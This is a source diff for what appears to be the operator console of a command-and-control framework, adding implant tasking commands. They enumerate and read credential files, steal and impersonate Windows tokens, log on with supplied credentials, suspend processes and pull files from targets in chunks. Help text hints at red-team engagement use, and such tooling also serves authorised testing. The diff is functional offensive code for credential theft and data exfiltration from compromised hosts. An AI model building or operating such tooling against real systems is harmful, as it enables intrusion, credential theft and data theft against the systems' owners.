@@ -2,7 +2,9 @@ package main
 
 import (
 	"bufio"
+	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -251,6 +253,105 @@ func main() {
 			}
 			cmdTask(client, activeSession.ID, "ps", "")
 
+		case "psinfo":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "process_info", "")
+
+		case "suspend", "resume":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError(fmt.Sprintf("Usage: %s <pid>", cmd))
+				continue
+			}
+			taskType := "process_suspend"
+			if cmd == "resume" {
+				taskType = "process_resume"
+			}
+			cmdTask(client, activeSession.ID, taskType, args[0])
+
+		case "getprivs":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "getprivs", "")
+
+		case "creds":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "credential_enum", "")
+
+		case "credread":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError("Usage: credread <path>")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "credential_read", args[0])
+
+		case "tokens":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "token_list", "")
+
+		case "steal":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError("Usage: steal <pid>")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "token_steal", args[0])
+
+		case "maketoken":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 2 {
+				printError("Usage: maketoken <username> <password> [domain]")
+				continue
+			}
+			req := map[string]string{"username": args[0], "password": args[1]}
+			if len(args) >= 3 {
+				req["domain"] = args[2]
+			}
+			data, _ := json.Marshal(req)
+			cmdTask(client, activeSession.ID, "token_make", string(data))
+
+		case "impersonate":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError("Usage: impersonate <token-id>")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "token_impersonate", args[0])
+
+		case "revert":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "token_revert", "")
+
 		case "cat":
 			if activeSession == nil {
 				printError("No active session. Use 'use <id>' first.")
@@ -428,6 +529,17 @@ func printHelp() {
 		{"pwd", "Print working directory on target"},
 		{"cd <path>", "Change directory on target"},
 		{"ps", "List running processes on target"},
+		{"psinfo", "Structured process list (JSON: PID, PPID, user, cmdline, RSS)"},
+		{"suspend <pid>", "Suspend a process (engagement privilege capability)"},
+		{"resume <pid>", "Resume a suspended process"},
+		{"getprivs", "List the implant's privileges (Windows) or capabilities (Linux)"},
+		{"creds", "Enumerate credential-bearing files and environment variables (gated)"},
+		{"credread <path>", "Read one credential file named by the operator (gated)"},
+		{"tokens", "List the current and stored tokens"},
+		{"steal <pid>", "Duplicate a process token and store it"},
+		{"maketoken <user> <pass> [domain]", "Log on with credentials and store the token"},
+		{"impersonate <id>", "Verify a stored token on a locked thread, then revert"},
+		{"revert", "Close all stored token handles"},
 		{"cat <file>", "Read file contents on target"},
 		{"upload <local> <remote>", "Upload a local file to the target"},
 		{"download <remote> [local]", "Download a file from the target"},
@@ -1027,6 +1139,12 @@ func cmdDownload(client *api.Client, sessionID string, remotePath string, localP
 		localPath = filepath.Base(remotePath)
 	}
 
+	// Prefer chunked transfer; fall back to the legacy single-result download
+	// when the implant does not implement the chunk task types.
+	if cmdDownloadChunked(client, sessionID, remotePath, localPath) {
+		return
+	}
+
 	req := TaskRequest{
 		Type: "download",
 		Args: remotePath,
@@ -1061,4 +1179,86 @@ func cmdDownload(client *api.Client, sessionID string, remotePath string, localP
 	}
 
 	printSuccess(fmt.Sprintf("Downloaded %d bytes to %s", len(decoded), localPath))
+}
+
+// cmdDownloadChunked streams a file in bounded chunks, avoiding the frame-size
+// and memory limits of a single base64 result. It returns false when the
+// implant does not support download_stat/download_chunk, so the caller can use
+// the legacy path.
+func cmdDownloadChunked(client *api.Client, sessionID, remotePath, localPath string) bool {
+	statResult, ok := submitAndPoll(client, sessionID, "download_stat", remotePath)
+	if !ok || !statResult.Success {
+		return false
+	}
+	var stat struct {
+		Size   int64  `json:"size"`
+		SHA256 string `json:"sha256"`
+	}
+	if err := json.Unmarshal([]byte(statResult.Output), &stat); err != nil {
+		return false
+	}
+
+	printInfo(fmt.Sprintf("Downloading %s (%d bytes) -> %s", remotePath, stat.Size, localPath))
+
+	file, err := os.Create(localPath)
+	if err != nil {
+		printError(fmt.Sprintf("Failed to create local file: %v", err))
+		return true
+	}
+	defer file.Close()
+
+	const chunkSize = 1 << 20
+	hasher := sha256.New()
+	var offset int64
+	for offset < stat.Size {
+		args, _ := json.Marshal(map[string]any{
+			"path":   remotePath,
+			"offset": offset,
+			"length": chunkSize,
+		})
+		result, ok := submitAndPoll(client, sessionID, "download_chunk", string(args))
+		if !ok {
+			_ = os.Remove(localPath)
+			return true
+		}
+		if !result.Success {
+			printError(fmt.Sprintf("Chunk download failed at offset %d: %s", offset, result.Error))
+			_ = os.Remove(localPath)
+			return true
+		}
+		var chunk struct {
+			Data   string `json:"data"`
+			Length int    `json:"length"`
+			EOF    bool   `json:"eof"`
+		}
+		if err := json.Unmarshal([]byte(result.Output), &chunk); err != nil {
+			printError(fmt.Sprintf("Failed to parse chunk at offset %d: %v", offset, err))
+			_ = os.Remove(localPath)
+			return true
+		}
+		data, err := base64.StdEncoding.DecodeString(chunk.Data)
+		if err != nil {
+			printError(fmt.Sprintf("Failed to decode chunk at offset %d: %v", offset, err))
+			_ = os.Remove(localPath)
+			return true
+		}
+		if _, err := file.WriteAt(data, offset); err != nil {
+			printError(fmt.Sprintf("Failed to write local chunk at offset %d: %v", offset, err))
+			_ = os.Remove(localPath)
+			return true
+		}
+		_, _ = hasher.Write(data)
+		offset += int64(len(data))
+		if chunk.EOF || len(data) == 0 {
+			break
+		}
+	}
+
+	if stat.SHA256 != "" {
+		if got := hex.EncodeToString(hasher.Sum(nil)); got != stat.SHA256 {
+			printWarning(fmt.Sprintf("SHA-256 mismatch: got %s, want %s", got, stat.SHA256))
+		}
+	}
+	printSuccess(fmt.Sprintf("Downloaded %d bytes to %s", offset, localPath))
+	return true
 }
